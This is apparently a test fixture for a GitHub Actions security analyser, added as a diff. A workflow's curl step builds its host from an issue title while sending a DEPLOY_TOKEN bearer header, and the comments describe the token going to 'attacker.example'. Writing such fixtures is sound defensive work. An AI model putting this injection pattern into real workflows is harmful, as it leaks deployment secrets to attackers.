@@ -1,0 +1,26 @@
+# situation: on workflow_dispatch, the curl command of a step names its host
+#   by the title of the issue, and sends the secret DEPLOY_TOKEN in an
+#   Authorization header. If the workflow also ran on issues, the rule would
+#   report the same step.
+# reason: no added gain: on workflow_dispatch the event has no issue object,
+#   so the expression of the title gives an empty string; whoever dispatches
+#   the workflow chooses the ref and the inputs of the dispatch, and the step
+#   reads no input of the dispatch.
+# cause: the table of the attacker's events that the rule reads does not
+#   have workflow_dispatch; the rule reports an input of a dispatch with the
+#   inconclusive kind input-dispatch.
+# attack-value: github.event.issue.title = "attacker.example"
+# attack-run-behavior: with the value put in, curl sends GET /status to
+#   attacker.example with Authorization: Bearer and the value of
+#   DEPLOY_TOKEN. On workflow_dispatch the event has no issue object,
+#   though: the expression gives an empty string, and curl fails on the URL
+#   https:///status.
+on: workflow_dispatch
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    env:
+      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+    steps:
+      - run: |
+          curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://${{ github.event.issue.title }}/status"
